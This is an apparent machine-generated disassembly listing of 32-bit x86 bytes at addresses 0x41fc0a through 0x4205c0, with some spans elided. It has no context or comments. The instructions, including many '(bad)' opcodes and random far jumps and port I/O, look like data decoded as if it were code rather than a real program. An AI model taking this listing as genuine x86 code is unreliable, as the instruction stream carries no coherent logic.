  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	jns    0x41fbd0
  41fc0e:	jne    0x41fbc7
  41fc10:	inc    ebx
  41fc11:	pop    edx
  41fc12:	push   eax
  41fc13:	adc    BYTE PTR [esi+ebx*1],ah
  41fc16:	adc    BYTE PTR [edx-0x10826f80],cl
  41fc1c:	push   0x16
  41fc1e:	std    
  41fc1f:	mov    bh,0x82
  41fc21:	mov    esi,DWORD PTR [edi+edi*4]
  41fc24:	ret    
  41fc25:	mov    ch,0xe3
  41fc27:	mov    edi,0x2a113efe
  41fc2c:	mov    fs,WORD PTR [edx]
  41fc2e:	lock xchg ecx,eax
  41fc30:	bound  edi,QWORD PTR [esi-0x46eefddf]
  41fc36:	jl     0x41fc04
  41fc38:	bound  edi,QWORD PTR [eax]
  41fc3a:	arpl   WORD PTR [edi+0x1e],si
  41fc3d:	popf   
  41fc3e:	jg     0x41fbff
  41fc40:	outs   dx,DWORD PTR ds:[esi]
  41fc41:	test   eax,0x744d04b1
  41fc46:	lods   al,BYTE PTR ds:[esi]
  41fc47:	mov    esp,0xc2e8410d
  41fc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc4d:	add    dh,BYTE PTR [ebp-0x2d]
  41fc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc51:	outs   dx,BYTE PTR ds:[esi]
  41fc52:	push   ebp
  41fc53:	adc    edi,ebp
  41fc55:	js     0x41fcb6
  41fc57:	cmc    
  41fc58:	pop    eax
  41fc59:	loopne 0x41fc6e
  41fc5b:	cdq    
  41fc5c:	or     eax,0xeae8f4b
  41fc61:	push   esp
  41fc62:	xchg   DWORD PTR [ebp+0x2a],ebp
  41fc65:	pusha  
  41fc66:	jl     0x41fc88
  41fc68:	sahf   
  41fc69:	rcr    DWORD PTR [eax+0x6b],1
  41fc6c:	cld    
  41fc6d:	aas    
  41fc6e:	mov    edi,0xe785848e
  41fc73:	ret    
  41fc74:	cmp    dl,BYTE PTR [ebp+0x67]
  41fc77:	fisubr WORD PTR [ecx+eiz*4]
  41fc7a:	aam    0x39
  41fc7c:	adc    ebp,DWORD PTR [esp+esi*1-0x8]
  41fc80:	loope  0x41fc76
  41fc82:	adc    ah,BYTE PTR [ecx-0x742ea856]
  41fc88:	rcl    DWORD PTR ds:0x343e3de3,0xe4
  41fc8f:	pop    edx
  41fc90:	push   ds
  41fc91:	dec    edi
  41fc92:	in     al,0x33
  41fc94:	dec    edi
  41fc95:	cwde   
  41fc96:	mov    WORD PTR [ecx+ebp*8],es
  41fc99:	and    al,0xfb
  41fc9b:	xchg   DWORD PTR [esi+0x3e],esp
  41fc9e:	xchg   edx,eax
  41fc9f:	mov    esi,0xeb08acdd
  41fca4:	in     al,dx
  41fca5:	xlat   BYTE PTR ds:[ebx]
  41fca6:	aas    
  41fca7:	push   esi
  41fca8:	idiv   BYTE PTR [edx+0x24866bf1]
  41fcae:	fisttp WORD PTR [edx]
  41fcb0:	ins    BYTE PTR es:[edi],dx
  41fcb1:	stos   BYTE PTR es:[edi],al
  41fcb2:	add    al,0x48
  41fcb4:	shl    DWORD PTR ss:[eax],1
  41fcb7:	pop    ebx
  41fcb8:	call   0x7780852
  41fcbd:	pop    esp
  41fcbe:	xor    ah,BYTE PTR [eax]
  41fcc0:	into   
  41fcc1:	sar    BYTE PTR [eax+0x7a],cl
  41fcc4:	ins    DWORD PTR es:[edi],dx
  41fcc5:	sbb    edi,0x7b
  41fcc8:	addr16 mov eax,0xb61750a6
  41fcce:	xor    al,0x1
  41fcd0:	inc    edx
  41fcd1:	and    ah,BYTE PTR [edi+0x301e76e6]
  41fcd7:	sub    eax,0x4b
  41fcda:	ins    DWORD PTR es:[edi],dx
  41fcdb:	imul   esi,ecx,0x84aeb43d
  41fce1:	outs   dx,DWORD PTR ds:[esi]
  41fce2:	mov    BYTE PTR [eax+esi*4],bh
  41fce5:	mov    edx,0xb5521867
  41fcea:	jg     0x41fcc0
  41fcec:	dec    ebp
  41fced:	xor    al,0x1e
  41fcef:	add    DWORD PTR [edi+0x5a],ebp
  41fcf2:	mov    edi,DWORD PTR [edx+0x58]
  41fcf5:	inc    eax
  41fcf6:	cld    
  41fcf7:	inc    ecx
  41fcf8:	imul   esp
  41fcfa:	push   ss
  41fcfb:	loope  0x41fcbc
  41fcfd:	and    cl,0x5
  41fd00:	(bad)
  41fd04:	mov    al,ds:0x8f9b125f
  41fd09:	sbb    al,0x83
  41fd0b:	ja     0x41fd4a
  41fd0d:	push   ss
  41fd0e:	test   eax,esp
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	cmp    edx,ebx
  41fd82:	fdivr  QWORD PTR [edx+0x152d8]
  41fd88:	add    al,0x1
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	imul   edx,DWORD PTR [edx+0x75],0x12
  41fd90:	mov    bl,0x58
  41fd92:	xor    edi,ebp
  41fd94:	sub    esi,DWORD PTR [edi]
  41fd96:	rol    DWORD PTR [esi],cl
  41fd98:	and    esi,0xc1de6326
  41fd9e:	jno    0x41fdc3
  41fda0:	push   ebp
  41fda1:	jp     0x41fd40
  41fda3:	enter  0xf09a,0x4b
  41fda7:	dec    esi
  41fda8:	retf   
  41fda9:	in     al,dx
  41fdaa:	mov    ebp,0x36f97f55
  41fdaf:	adc    al,0x71
  41fdb1:	in     eax,dx
  41fdb2:	inc    esi
  41fdb3:	sbb    BYTE PTR [edi+0x77],bh
  41fdb6:	lods   eax,DWORD PTR ds:[esi]
  41fdb7:	mov    ch,0x4e
  41fdb9:	sar    DWORD PTR [edi+0x28],0xe9
  41fdbd:	xchg   esp,eax
  41fdbe:	dec    ebx
  41fdbf:	pop    edx
  41fdc0:	fiadd  WORD PTR [esi-0x342fd643]
  41fdc6:	stos   DWORD PTR es:[edi],eax
  41fdc7:	jne    0x41fe32
  41fdc9:	pop    ss
  41fdca:	cmp    ch,bl
  41fdcc:	ja     0x41fd52
  41fdce:	mov    eax,0x62a76e36
  41fdd3:	jne    0x41fdf7
  41fdd5:	push   esp
  41fdd6:	out    0x21,al
  41fdd8:	ror    DWORD PTR [ebp-0x38544d3d],0x4c
  41fddf:	sub    eax,0xa40fa1e4
  41fde4:	pop    esi
  41fde5:	dec    edx
  41fde6:	xor    ebx,edx
  41fde8:	cmp    DWORD PTR [eax+edx*1-0x3d3fba30],ebx
  41fdef:	and    al,0xf6
  41fdf1:	test   BYTE PTR [ecx+0x14],ah
  41fdf4:	ds into 
  41fdf6:	jae    0x41fe0b
  41fdf8:	cmc    
  41fdf9:	popf   
  41fdfa:	out    0x6f,eax
  41fdfc:	mov    bl,0xb1
  41fdfe:	lea    esp,[eax-0x12]
  41fe01:	xchg   ebp,eax
  41fe02:	push   edx
  41fe03:	jp     0x41fe02
  41fe05:	sub    esi,DWORD PTR [edi]
  41fe07:	and    al,0xd
  41fe09:	mov    eax,DWORD PTR [esi-0x18]
  41fe0c:	mov    esp,0x16a5628d
  41fe11:	xchg   ecx,eax
  41fe12:	(bad)  
  41fe13:	ds cmc 
  41fe15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe16:	mov    dl,0x21
  41fe18:	sub    al,0x34
  41fe1a:	dec    esp
  41fe1b:	cmp    ah,ch
  41fe1d:	pop    ebx
  41fe1e:	push   ecx
  41fe1f:	fucomi st,st(2)
  41fe21:	adc    ebp,0xffffffb2
  41fe24:	pop    esp
  41fe25:	out    0xf4,al
  41fe27:	push   edi
  41fe28:	into   
  41fe29:	in     eax,dx
  41fe2a:	mov    WORD PTR [esi+0x7e],cs
  41fe2d:	lock mov eax,ds:0x1fb75ac1
  41fe33:	inc    esi
  41fe34:	pop    esi
  41fe35:	dec    edi
  41fe36:	lds    eax,FWORD PTR [eax+0x4c]
  41fe39:	(bad)  
  41fe3a:	in     eax,dx
  41fe3b:	js     0x41fdd4
  41fe3d:	cld    
  41fe3e:	adc    DWORD PTR [edi+0x62],eax
  41fe41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe42:	push   ecx
  41fe43:	es sub eax,0x75867f70
  41fe49:	lea    ecx,[edi+edx*1-0xadf2ba2]
  41fe50:	jl     0x41fe81
  41fe52:	jge    0x41fdd5
  41fe54:	shld   DWORD PTR [ebx+0x2b],eax,0xca
  41fe59:	xor    ecx,DWORD PTR [ebp+ecx*4-0x7d03e8cf]
  41fe60:	test   esi,ebx
  41fe62:	add    al,0x69
  41fe64:	xor    al,0xf0
  41fe66:	xor    al,al
  41fe68:	add    eax,0xc5237143
  41fe6d:	test   WORD PTR [eax],ax
  41fe70:	aaa    
  41fe71:	ret    0xa356
  41fe74:	fiadd  WORD PTR [edi+0x19]
  41fe77:	jb     0x41fe03
  41fe79:	or     DWORD PTR [edx+0x3d],ecx
  41fe7c:	cmc    
  41fe7d:	cmc    
  41fe7e:	sti    
  41fe7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe80:	mov    ebp,eax
  41fe82:	retf   0xc429
  41fe85:	and    BYTE PTR [ecx],ah
  41fe87:	cmp    DWORD PTR [edi+edx*8],eax
  41fe8a:	aad    0xcb
  41fe8c:	adc    al,0x12
  41fe8e:	test   bl,ah
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xf4
  41ff01:	dec    ebp
  41ff02:	and    al,0x38
  41ff04:	fcom   QWORD PTR [ebx+0x1]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	push   ebp
  41ff0d:	jecxz  0x41fea5
  41ff0f:	xor    dh,bh
  41ff11:	dec    esi
  41ff12:	loop   0x41fee1
  41ff14:	jns    0x41ff46
  41ff16:	repnz push ds
  41ff18:	jns    0x41ff33
  41ff1a:	dec    ebx
  41ff1b:	sbb    DWORD PTR [ebx+edi*8-0x39586df3],esi
  41ff22:	mov    ebx,0x3d91c899
  41ff27:	lahf   
  41ff28:	aaa    
  41ff29:	test   eax,0x71ff9e42
  41ff2e:	scas   al,BYTE PTR es:[edi]
  41ff2f:	mov    bh,0x75
  41ff31:	fild   QWORD PTR [edx]
  41ff33:	inc    esp
  41ff34:	jmp    0xde6b90be
  41ff39:	xor    esp,DWORD PTR [eax]
  41ff3b:	jnp    0x41fee7
  41ff3d:	(bad)  
  41ff3e:	xor    BYTE PTR [ebx],0x4e
  41ff41:	in     eax,0x1c
  41ff43:	xor    eax,0x23ae4392
  41ff48:	into   
  41ff49:	mov    ch,BYTE PTR [ebp-0x75]
  41ff4c:	enter  0x3930,0x8c
  41ff50:	scas   al,BYTE PTR es:[edi]
  41ff51:	(bad)  
  41ff52:	push   ebp
  41ff53:	or     ch,BYTE PTR [ecx]
  41ff55:	in     eax,0x38
  41ff57:	inc    ebx
  41ff58:	iret   
  41ff59:	and    dh,BYTE PTR [ebx]
  41ff5b:	call   0x9dd5:0xc1258b65
  41ff62:	mov    dl,0x2
  41ff64:	add    DWORD PTR [edi+0x58e845ff],esi
  41ff6a:	ins    DWORD PTR es:[edi],dx
  41ff6b:	or     ch,BYTE PTR [ebp+0x4f]
  41ff6e:	clc    
  41ff6f:	addr16 lock jle 0x41ff9d
  41ff73:	dec    dx
  41ff75:	pop    edi
  41ff76:	xchg   ecx,eax
  41ff77:	jmp    0xf585:0xef1744eb
  41ff7e:	aam    0xdf
  41ff80:	bound  ebp,QWORD PTR [ebp-0x46]
  41ff83:	cmc    
  41ff84:	(bad)  
  41ff86:	cld    
  41ff87:	xchg   ebp,eax
  41ff88:	mov    ch,BYTE PTR [esi+0x40]
  41ff8b:	add    al,bh
  41ff8d:	scas   al,BYTE PTR es:[edi]
  41ff8e:	xchg   ebx,eax
  41ff8f:	jnp    0x41ffb6
  41ff91:	cmp    bl,BYTE PTR [ecx]
  41ff93:	xchg   ebp,eax
  41ff94:	mov    cl,0x2a
  41ff96:	sbb    DWORD PTR [eax+eiz*4],ebp
  41ff99:	in     al,dx
  41ff9a:	mov    bl,dh
  41ff9c:	fwait
  41ff9d:	inc    ebx
  41ff9e:	xchg   esp,eax
  41ff9f:	je     0x41ff88
  41ffa1:	cmp    esi,DWORD PTR [eax-0x7f]
  41ffa4:	jb     0x42001d
  41ffa6:	or     esi,edi
  41ffa8:	inc    ebp
  41ffa9:	cmp    ah,BYTE PTR [edi-0x4c9c4c7c]
  41ffaf:	cs addr16 test al,0x55
  41ffb3:	inc    ebx
  41ffb4:	jns    0x41ff5a
  41ffb6:	out    dx,eax
  41ffb7:	je     0x41ffe5
  41ffb9:	cli    
  41ffba:	enter  0x6469,0x96
  41ffbe:	hlt    
  41ffbf:	scas   al,BYTE PTR es:[edi]
  41ffc0:	adc    eax,0x7d3b6e9
  41ffc5:	push   ds
  41ffc6:	cmp    BYTE PTR [edi-0x5a],bh
  41ffc9:	ja     0x41ffba
  41ffcb:	jne    0x41ffcb
  41ffcd:	sub    eax,0xbf8d86d1
  41ffd2:	das    
  41ffd3:	shl    DWORD PTR [eax+ebx*8],0x1a
  41ffd7:	mov    cl,0xa
  41ffd9:	sbb    DWORD PTR [ebx],esi
  41ffdb:	stc    
  41ffdc:	pop    esp
  41ffdd:	sub    ebx,eax
  41ffdf:	mov    ebx,0x3a659690
  41ffe4:	or     al,0x15
  41ffe6:	lds    ebp,FWORD PTR [ebx+0x65]
  41ffe9:	cdq    
  41ffea:	sbb    al,0x95
  41ffec:	pushf  
  41ffed:	clc    
  41ffee:	jo     0x41ffc1
  41fff0:	or     BYTE PTR [ebp-0x2c7d6df4],ah
  41fff6:	push   edi
  41fff7:	lods   eax,DWORD PTR ds:[esi]
  41fff8:	aam    0x4f
  41fffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fffb:	out    0x93,eax
  41fffd:	or     edx,edi
  41ffff:	mov    WORD PTR [ebp+0x45],ds
  420002:	push   ds
  420003:	and    al,0xb0
  420005:	dec    ecx
  420007:	fstp   DWORD PTR [eax]
  420009:	std    
  42000a:	pop    eax
  42000b:	sbb    edx,DWORD PTR [ebx]
  42000d:	mov    WORD PTR [esi+eiz*8+0x0],ss
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffab
  420081:	(bad)  
  420082:	pop    ebx
  420083:	dec    ebp
  420084:	loopne 0x4200da
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	xchg   ecx,eax
  42008d:	dec    eax
  42008e:	pop    ecx
  42008f:	lea    ebp,[ebp-0x6a]
  420092:	leave  
  420093:	mov    ebp,DWORD PTR [edx-0x31]
  420096:	ret    0x40e4
  420099:	adc    ebx,DWORD PTR [edx]
  42009b:	ret    0x81da
  42009e:	push   ecx
  42009f:	test   eax,0x7fe21441
  4200a4:	popf   
  4200a5:	push   esi
  4200a6:	sti    
  4200a7:	retf   0x8a67
  4200aa:	mov    cl,0x8b
  4200ac:	mov    ?,WORD PTR [ebx]
  4200ae:	scas   al,BYTE PTR es:[edi]
  4200af:	clc    
  4200b0:	pop    edi
  4200b1:	inc    ecx
  4200b2:	mov    DWORD PTR [esi-0x7c0c7b32],esp
  4200b8:	pop    esp
  4200b9:	and    eax,0xefc57dd
  4200be:	repz mov dh,0x6f
  4200c1:	xor    BYTE PTR [esi+0x9320da],dh
  4200c7:	(bad)  
  4200c8:	jmp    0x420095
  4200ca:	hlt    
  4200cb:	retf   
  4200cc:	mov    bh,0xe8
  4200ce:	lods   al,BYTE PTR ds:[esi]
  4200cf:	push   esp
  4200d0:	cmp    DWORD PTR [eax-0x6e],0xffffffbb
  4200d4:	and    BYTE PTR [eax-0x65],0x2d
  4200d8:	inc    eax
  4200d9:	push   ecx
  4200da:	adc    dl,BYTE PTR [ebp-0x6ed793c6]
  4200e0:	jp     0x4200f5
  4200e2:	xchg   esp,eax
  4200e3:	sbb    cl,0x8b
  4200e6:	in     al,0x2e
  4200e8:	mov    ds:0xf7e16239,eax
  4200ed:	add    al,BYTE PTR [ecx-0x29]
  4200f0:	clc    
  4200f1:	jae    0x42008f
  4200f3:	aam    0x46
  4200f5:	adc    bh,al
  4200f7:	dec    ebx
  4200f8:	lods   eax,DWORD PTR ds:[esi]
  4200f9:	sub    BYTE PTR [edx+esi*4-0x43a203d0],dh
  420100:	shl    DWORD PTR [eax+ebx*8-0x2d],cl
  420104:	mov    al,0x62
  420106:	(bad)  [esi+0x6d786f8b]
  42010c:	imul   ecx,edi,0x8574406e
  420112:	in     eax,0x84
  420114:	inc    esi
  420115:	mov    eax,ds:0xe1b8c056
  42011a:	pop    ss
  42011b:	fdiv   DWORD PTR [ecx-0x25]
  42011e:	mov    ebx,0xb2d3d1ab
  420123:	or     al,0xa1
  420125:	sti    
  420126:	ss ss push ds
  420129:	pushf  
  42012a:	aaa    
  42012b:	mov    dh,0xd3
  42012d:	sub    ah,dh
  42012f:	cwde   
  420130:	inc    edi
  420131:	stos   BYTE PTR es:[edi],al
  420132:	or     dl,0x41
  420135:	pushf  
  420136:	fld    QWORD PTR [ebp+0x7e7f61c3]
  42013c:	jbe    0x420128
  42013e:	xchg   edx,eax
  42013f:	mov    ah,cl
  420141:	cmc    
  420142:	shr    DWORD PTR [esi-0xb],cl
  420145:	je     0x420172
  420147:	jmp    0xc9d301b3
  42014c:	push   0x2a
  42014e:	cmp    eax,0x70fc8b49
  420153:	stos   BYTE PTR es:[edi],al
  420154:	repz or BYTE PTR [ebx],cl
  420157:	sub    DWORD PTR [eax+0x5d1b8cf0],ecx
  42015d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015e:	xchg   edx,eax
  42015f:	and    ecx,edi
  420161:	xchg   ecx,eax
  420162:	div    BYTE PTR [edi+edi*1+0xb95c649]
  420169:	sbb    bh,BYTE PTR [edi+0x47ccc7eb]
  42016f:	pop    ecx
  420170:	adc    esi,DWORD PTR [esi]
  420172:	cmp    ebx,DWORD PTR [ecx]
  420174:	mov    edx,0xea7a6a99
  420179:	outs   dx,BYTE PTR ds:[esi]
  42017a:	mov    ebx,0xa33e123
  42017f:	jmp    0xf42f7bb4
  420184:	xchg   esi,eax
  420185:	xor    eax,0x814f202a
  42018a:	in     al,0xdb
  42018c:	jp     0x42017c
  42018e:	test   eax,0x86
	...
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x2b9b2e11],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	and    DWORD PTR [ecx-0x29],esi
  42020f:	jge    0x4201a7
  420211:	sbb    eax,0x1610ab2f
  420216:	rcr    BYTE PTR [ebx],0x42
  420219:	jns    0x42025d
  42021b:	clc    
  42021c:	and    dl,BYTE PTR [eax-0x4f]
  42021f:	lahf   
  420220:	retf   0xd9a2
  420223:	div    edi
  420225:	pop    ss
  420226:	fwait
  420227:	pop    ss
  420228:	sub    DWORD PTR [ebx+0x6ed232ae],0xbb9a5f9b
  420232:	(bad)  
  420234:	xlat   BYTE PTR ds:[ebx]
  420235:	out    0x5a,al
  420237:	and    al,0x69
  420239:	pusha  
  42023a:	or     esp,esp
  42023c:	test   ah,ch
  42023e:	pop    ss
  42023f:	or     ecx,eax
  420241:	cmp    al,0xa3
  420243:	cmp    DWORD PTR [esi],ecx
  420245:	int    0x59
  420247:	mov    eax,0x59b633d7
  42024c:	or     ecx,DWORD PTR [eax-0x31b235d3]
  420252:	(bad)  
  420253:	and    bh,BYTE PTR [eax]
  420255:	and    DWORD PTR [esi],ebx
  420257:	call   0x8b7c:0xd098ec0f
  42025e:	imul   eax,DWORD PTR [eax+0x4bc5f89b],0x1a
  420265:	push   cs
  420266:	xor    ebx,DWORD PTR [ecx+0x25675d47]
  42026c:	(bad)  
  42026d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42026e:	push   ss
  42026f:	sub    edi,DWORD PTR [ebx+0x728e7047]
  420275:	es jbe 0x42026a
  420278:	dec    ebx
  420279:	push   edx
  42027a:	je     0x420276
  42027c:	ds jmp 0x9705:0xe571be9f
  420284:	adc    al,0xbf
  420286:	cmp    DWORD PTR [edi-0x44f0963c],0x490d44f3
  420290:	pop    ss
  420291:	pop    es
  420292:	fs sub eax,0x8616da37
  420298:	sub    cl,0xa5
  42029b:	mov    edi,0xbbc20f57
  4202a0:	mov    cl,0xe7
  4202a3:	out    dx,al
  4202a4:	nop
  4202a5:	enter  0x2a1e,0x1f
  4202a9:	pop    ebp
  4202aa:	sbb    al,0x5f
  4202ac:	aas    
  4202ad:	pop    ss
  4202ae:	dec    esp
  4202af:	pusha  
  4202b0:	xchg   ebp,eax
  4202b1:	dec    ebp
  4202b2:	ds retf 0xc3b0
  4202b6:	jge    0x420241
  4202b8:	jb     0x4202ff
  4202ba:	mov    ?,ecx
  4202bc:	stos   BYTE PTR es:[edi],al
  4202bd:	mov    al,0x8b
  4202bf:	arpl   si,bx
  4202c1:	scas   eax,DWORD PTR es:[edi]
  4202c2:	pop    ecx
  4202c3:	(bad)  
  4202c4:	mov    ah,dl
  4202c6:	fadd   QWORD PTR [ebp+0x6e77009a]
  4202cc:	lods   al,BYTE PTR ds:[esi]
  4202cd:	xor    bh,0xaf
  4202d0:	mov    ebp,0x9fba4501
  4202d5:	mov    al,ds:0xeef42266
  4202da:	pop    ds
  4202db:	push   ecx
  4202dc:	(bad)  
  4202de:	mov    bl,ah
  4202e0:	xchg   ebp,eax
  4202e1:	dec    esp
  4202e2:	(bad)  
  4202e3:	mov    bh,0xa5
  4202e5:	mov    ah,0x13
  4202e7:	out    dx,eax
  4202e8:	out    0xab,eax
  4202ea:	pop    edx
  4202eb:	call   0x1832f9f7
  4202f0:	(bad)  
  4202f1:	(bad)  
  4202f2:	xor    al,0xf4
  4202f4:	push   0x2a
  4202f6:	pop    ebx
  4202f7:	cmp    DWORD PTR [ecx],edx
  4202f9:	dec    eax
  4202fa:	jle    0x420301
  4202fc:	fnsave [ecx+0x52]
  4202ff:	cmp    eax,0xcea347d1
  420304:	ret    
  420305:	or     al,bl
  420307:	cld    
  420308:	inc    esp
  420309:	and    BYTE PTR [ebp-0x1e873d10],dl
  42030f:	jl     0x420311
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	shl    DWORD PTR [eax-0x2],1
  420383:	xor    al,0xe8
  420385:	push   esi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	mov    edi,0x662b7329
  420391:	jmp    DWORD PTR ds:0xe1d6c330
  420397:	inc    esi
  420398:	pop    edx
  420399:	ins    BYTE PTR es:[edi],dx
  42039a:	sbb    ecx,esi
  42039c:	shr    DWORD PTR [esi-0x124bbb0a],0x5f
  4203a3:	mov    dh,0x4d
  4203a5:	mov    dh,0xa2
  4203a7:	push   0xffffffff
  4203a9:	mov    eax,0x35fbb2da
  4203ae:	jge    0x4203de
  4203b0:	nop
  4203b1:	mov    edi,0xd8852c80
  4203b6:	dec    edx
  4203b7:	push   eax
  4203b8:	pop    ds
  4203b9:	pop    ds
  4203ba:	jmp    0x420384
  4203bc:	adc    dh,bh
  4203be:	ret    
  4203bf:	cdq    
  4203c0:	leave  
  4203c1:	rcl    DWORD PTR [eax+0x21a174e0],0x70
  4203c8:	sahf   
  4203c9:	mov    ebp,esp
  4203cb:	inc    ebx
  4203cc:	jl     0x420391
  4203ce:	out    0x50,al
  4203d0:	test   DWORD PTR [edi+0x15],ebp
  4203d3:	jecxz  0x4203a5
  4203d5:	in     al,dx
  4203d6:	adc    DWORD PTR [esi+0xf182bd4],ebx
  4203dc:	punpcklwd mm4,DWORD PTR [esi]
  4203df:	jmp    0xde6c:0xfd6bca2b
  4203e6:	mov    ds:0x2e16b198,eax
  4203eb:	into   
  4203ec:	mov    ds:0x391b315,al
  4203f1:	add    cl,BYTE PTR [edx-0x362d2068]
  4203f7:	or     al,0x40
  4203f9:	mov    ecx,0x5e865c59
  4203fe:	imul   esi,edx,0x333463ed
  420404:	push   ecx
  420405:	push   esp
  420406:	(bad)  
  420407:	push   ebp
  420409:	(bad)  [edi]
  42040b:	sbb    eax,0x63623069
  420410:	ss xchg ebx,eax
  420412:	pop    edx
  420413:	jmp    0x6560:0xefd2f7a5
  42041a:	ins    DWORD PTR es:[edi],dx
  42041b:	fsub   QWORD PTR [edx-0x769702e4]
  420421:	xor    al,0x1a
  420423:	mov    edx,0x46e567d5
  420428:	sub    ecx,ebx
  42042a:	adc    eax,0x29651f13
  42042f:	mov    eax,ds:0x4a8d3924
  420434:	inc    edx
  420435:	inc    esi
  420436:	fcmovnu st,st(1)
  420438:	adc    al,0x0
  42043a:	repnz mov WORD PTR [edi-0x2d],ds
  42043e:	fwait
  42043f:	adc    eax,0x9251199a
  420444:	arpl   sp,bp
  420446:	lahf   
  420447:	jns    0x420412
  420449:	outs   dx,BYTE PTR ds:[esi]
  42044a:	jg     0x420402
  42044c:	xor    ebx,DWORD PTR [edi-0x70]
  42044f:	and    BYTE PTR ds:0xe27618bf,0xaa
  420456:	pop    esp
  420457:	cdq    
  420458:	pusha  
  420459:	imul   edx,DWORD PTR [edi*1+0x1cf78724],0x3
  420461:	fwait
  420462:	jbe    0x420489
  420464:	adc    ebp,DWORD PTR [eax+0x20cf13b8]
  42046a:	inc    ebp
  42046b:	(bad)  
  42046c:	push   cs
  42046d:	addr16 xchg al,ch
  420470:	bound  edi,QWORD PTR [ecx+ebx*2-0x3b820c7b]
  420477:	test   al,0xa5
  420479:	pop    edx
  42047a:	pusha  
  42047b:	and    DWORD PTR [esi+0xb],edi
  42047e:	sti    
  42047f:	out    0x75,eax
  420481:	and    ch,0x7d
  420484:	stos   BYTE PTR es:[edi],al
  420485:	loop   0x4204c0
  420487:	sub    al,0xf6
  420489:	jg     0x4204df
  42048b:	mov    ebp,0xdf6369c5
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	mov    bl,0x7a
  420502:	sbb    dh,BYTE PTR ds:0x157ec
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	add    esi,DWORD PTR [edi+0x5a25dfec]
  420512:	aam    0xe6
  420514:	arpl   WORD PTR [edx+0x395c4eb0],sp
  42051a:	jmp    0x5431:0xe7b3ebfb
  420521:	mov    dl,BYTE PTR [esi-0x15b391fe]
  420527:	inc    edi
  420528:	or     eax,0x1c361b92
  42052d:	test   DWORD PTR [ebx-0x9],ebx
  420530:	lock ret 
  420532:	int    0xe7
  420534:	arpl   WORD PTR [ecx+ebp*8-0x573816c1],ax
  42053b:	xchg   edi,eax
  42053c:	sbb    BYTE PTR [edx-0x76],dh
  42053f:	add    BYTE PTR [ebp+0x21],dl
  420542:	pop    ss
  420543:	inc    ebp
  420544:	jne    0x4205bd
  420546:	xor    dl,BYTE PTR [eax-0x26]
  420549:	xchg   ebx,edi
  42054b:	jnp    0x4204fe
  42054d:	imul   ecx,DWORD PTR [eax],0xffffff9c
  420550:	sti    
  420551:	loopne 0x420527
  420553:	aad    0x4f
  420555:	mov    bl,0x97
  420557:	pop    esi
  420558:	popa   
  420559:	repnz add ecx,DWORD PTR [ebp+0x79]
  42055d:	rcl    BYTE PTR [edx],0x3d
  420560:	xchg   edi,eax
  420561:	pushf  
  420562:	adc    dl,0x45
  420565:	dec    esi
  420566:	inc    edi
  420567:	xor    ch,bl
  420569:	push   ebx
  42056a:	fidiv  WORD PTR [ecx-0x4caa1034]
  420570:	ins    BYTE PTR es:[edi],dx
  420571:	gs mov dh,0x7c
  420574:	into   
  420575:	call   0x9e2c84e3
  42057a:	fisttp DWORD PTR [ebx]
  42057c:	ficom  WORD PTR [esi+0x17a10429]
  420582:	inc    esp
  420583:	mov    ah,0x63
  420585:	dec    esp
  420586:	les    edi,FWORD PTR [ebx]
  420588:	mov    cl,0xac
  42058a:	dec    edi
  42058b:	and    eax,0x5c
  42058e:	add    ebp,DWORD PTR [edx+0x17]
  420591:	(bad)  
  420592:	fld    DWORD PTR [edi-0x51]
  420595:	retf   
  420596:	out    0xf5,al
  420598:	ss leave 
  42059a:	les    esi,FWORD PTR [edx+0x796b07e6]
  4205a0:	repz sub bl,BYTE PTR [ebx+eax*8-0x34866084]
  4205a8:	jb     0x42052e
  4205aa:	int    0x81
  4205ac:	in     al,dx
  4205ad:	inc    ebx
  4205ae:	pop    ss
  4205af:	sti    
  4205b0:	fldenv [edx-0x33]
  4205b3:	gs stc 
  4205b5:	(bad)  
  4205b6:	sub    al,0x21
  4205b8:	push   ds
  4205b9:	pop    ecx
  4205ba:	add    DWORD PTR [edx-0x5ead5206],esi
  4205c0:	cmp    BYTE PTR [edi+eax*1],0xe3
